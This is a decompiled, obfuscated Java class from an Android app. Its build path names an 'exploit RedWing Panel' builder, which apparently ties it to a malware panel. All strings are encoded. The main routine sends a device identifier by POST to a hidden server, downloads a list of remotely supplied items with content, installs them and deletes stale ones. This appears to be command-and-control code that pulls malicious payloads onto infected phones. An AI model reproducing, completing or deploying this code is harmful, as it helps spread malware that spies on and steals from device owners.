package v.s;

import android.content.Context;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashSet;
import org.json.JSONArray;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class XopfkSX0nabMIVQ extends jh03IwKTfxTtT1U implements NhN5GSKLYh6STld4 {
    public final /* synthetic */ Context ibVTtJUNfrGYbW;
    public final /* synthetic */ int xDyLpEZyrcKVe0;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public /* synthetic */ XopfkSX0nabMIVQ(Context context, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q, int i) {
        super(2, b9xroaxfr1fmoo2q);
        this.xDyLpEZyrcKVe0 = i;
        this.ibVTtJUNfrGYbW = context;
    }

    @Override // v.s.NhN5GSKLYh6STld4
    public final Object b1EoSIRjJHO5(Object obj, Object obj2) {
        wh3Lv6S5rs6zqjV wh3lv6s5rs6zqjv = (wh3Lv6S5rs6zqjV) obj;
        b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q = (b9xRoaXFR1fmOO2Q) obj2;
        switch (this.xDyLpEZyrcKVe0) {
            case 0:
                XopfkSX0nabMIVQ xopfkSX0nabMIVQ = (XopfkSX0nabMIVQ) dDIMxZXP1V8HdM(wh3lv6s5rs6zqjv, b9xroaxfr1fmoo2q);
                Eo0e0FTdv96U7KeCzoB eo0e0FTdv96U7KeCzoB = Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                xopfkSX0nabMIVQ.vekpFI4d1Nc4fakF(eo0e0FTdv96U7KeCzoB);
                return eo0e0FTdv96U7KeCzoB;
            default:
                XopfkSX0nabMIVQ xopfkSX0nabMIVQ2 = (XopfkSX0nabMIVQ) dDIMxZXP1V8HdM(wh3lv6s5rs6zqjv, b9xroaxfr1fmoo2q);
                Eo0e0FTdv96U7KeCzoB eo0e0FTdv96U7KeCzoB2 = Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                xopfkSX0nabMIVQ2.vekpFI4d1Nc4fakF(eo0e0FTdv96U7KeCzoB2);
                return eo0e0FTdv96U7KeCzoB2;
        }
    }

    @Override // v.s.CWIOrUfHtKyaxQib0W
    public final b9xRoaXFR1fmOO2Q dDIMxZXP1V8HdM(Object obj, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q) {
        switch (this.xDyLpEZyrcKVe0) {
            case 0:
                return new XopfkSX0nabMIVQ(this.ibVTtJUNfrGYbW, b9xroaxfr1fmoo2q, 0);
            default:
                return new XopfkSX0nabMIVQ((SyncQYAdapter) this.ibVTtJUNfrGYbW, b9xroaxfr1fmoo2q, 1);
        }
    }

    @Override // v.s.CWIOrUfHtKyaxQib0W
    public final Object vekpFI4d1Nc4fakF(Object obj) {
        int i = this.xDyLpEZyrcKVe0;
        Eo0e0FTdv96U7KeCzoB eo0e0FTdv96U7KeCzoB = Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
        Context context = this.ibVTtJUNfrGYbW;
        switch (i) {
            case 0:
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                try {
                    int i2 = 0;
                    HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(KgSM0TsKUpCiuePB.gwqvW1YsHBmGtO8bW7F(KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(58), '/') + TypefaceCache.obtain("006C0077004B008E00BF00BB00D300B3002200390052008900FA00BA00D100B3006C0062005E008A00E000B300D300B300260065")).openConnection();
                    httpURLConnection.setRequestMethod("POST");
                    httpURLConnection.setRequestProperty(TypefaceCache.obtain("000000790055009300F500B100C600EA0017006F004B0082"), TypefaceCache.obtain("00220066004B008B00F900BC00D300B3002A0079005500C800FA00AC00DD00A9007800360058008F00F100AD00C100A20037002B004E009300F600F2008A"));
                    httpURLConnection.setDoOutput(true);
                    httpURLConnection.setConnectTimeout(10000);
                    httpURLConnection.setReadTimeout(10000);
                    long jCurrentTimeMillis = System.currentTimeMillis() / ((long) 1000);
                    ktukzhfmAkOuMU ktukzhfmakoumu = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                    String strGmNWMfvn6zlEj = ktukzhfmAkOuMU.gmNWMfvn6zlEj(context);
                    httpURLConnection.setRequestProperty(TypefaceCache.obtain("001B003B007F008200E600B600D100A2006E005F007F"), strGmNWMfvn6zlEj);
                    GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM(httpURLConnection, jCurrentTimeMillis);
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put(TypefaceCache.obtain("00370073005A008A00CF00B600D6"), KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(61));
                    jSONObject.put(TypefaceCache.obtain("00270073004D008E00F300BA00ED00AE0027"), strGmNWMfvn6zlEj);
                    String string = jSONObject.toString();
                    OutputStream outputStream = httpURLConnection.getOutputStream();
                    try {
                        Charset charset = N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM;
                        outputStream.write(string.getBytes(charset));
                        outputStream.close();
                        if (httpURLConnection.getResponseCode() == 200) {
                            JSONArray jSONArrayOptJSONArray = new JSONObject(RIZfHbqXpth8r2yN4.pyu8ovAipBTLYAiKab(new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream(), charset), 8192))).optJSONArray(TypefaceCache.obtain("003700730056009700FC00BE00C600A20030"));
                            if (jSONArrayOptJSONArray == null) {
                                jSONArrayOptJSONArray = new JSONArray();
                            }
                            LinkedHashSet linkedHashSet = new LinkedHashSet();
                            int length = jSONArrayOptJSONArray.length();
                            for (int i3 = 0; i3 < length; i3++) {
                                JSONObject jSONObject2 = jSONArrayOptJSONArray.getJSONObject(i3);
                                String string2 = jSONObject2.getString(TypefaceCache.obtain("003700770049008000F500AB00ED00B7002200750050008600F700BA"));
                                String strOptString = jSONObject2.optString(TypefaceCache.obtain("00220066004B00B800FE00BE00DF00A2"), string2);
                                String strOptString2 = jSONObject2.optString(TypefaceCache.obtain("002B00620056008B00CF00BC00DD00A90037007300550093"), "");
                                if (string2.length() > 0 && strOptString2.length() > 0) {
                                    String str = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
                                    GQh1bKoqkKhujFH2nJ.ibVTtJUNfrGYbW(context, string2, strOptString, strOptString2);
                                    linkedHashSet.add(string2);
                                }
                            }
                            ArrayList list = Collections.list(GQh1bKoqkKhujFH2nJ.xDyLpEZyrcKVe0.keys());
                            ArrayList arrayList = new ArrayList();
                            int size = list.size();
                            int i4 = 0;
                            while (i4 < size) {
                                Object obj2 = list.get(i4);
                                i4++;
                                if (!linkedHashSet.contains((String) obj2)) {
                                    arrayList.add(obj2);
                                }
                            }
                            int size2 = arrayList.size();
                            while (i2 < size2) {
                                Object obj3 = arrayList.get(i2);
                                i2++;
                                String str2 = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
                                GQh1bKoqkKhujFH2nJ.xDyLpEZyrcKVe0(context, (String) obj3);
                            }
                            String str3 = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
                            TypefaceCache.obtain("0010006F0055008400F500BB0092");
                            linkedHashSet.size();
                            TypefaceCache.obtain("00630062005E008A00E000B300D300B300260065001B008100E200B000DF00E7003000730049009100F500AD");
                        } else {
                            TypefaceCache.obtain("0010006F0055008400B000B900D300AE002F0073005F00DD00B0009700E6009300130036");
                            httpURLConnection.getResponseCode();
                        }
                        httpURLConnection.disconnect();
                    } catch (Throwable th) {
                        try {
                            throw th;
                        } catch (Throwable th2) {
                            okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(outputStream, th);
                            throw th2;
                        }
                    }
                } catch (Exception e) {
                    String str4 = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
                    TypefaceCache.obtain("0030006F0055008400D600AD00DD00AA001000730049009100F500AD009200A2003100640054009500AA00FF");
                    e.getMessage();
                }
                return eo0e0FTdv96U7KeCzoB;
            default:
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                try {
                    ktukzhfmAkOuMU ktukzhfmakoumu2 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                    ktukzhfmAkOuMU.vIJudZvPyTuNp(((SyncQYAdapter) context).getApplicationContext());
                    break;
                } catch (Exception unused) {
                }
                return eo0e0FTdv96U7KeCzoB;
        }
    }
}
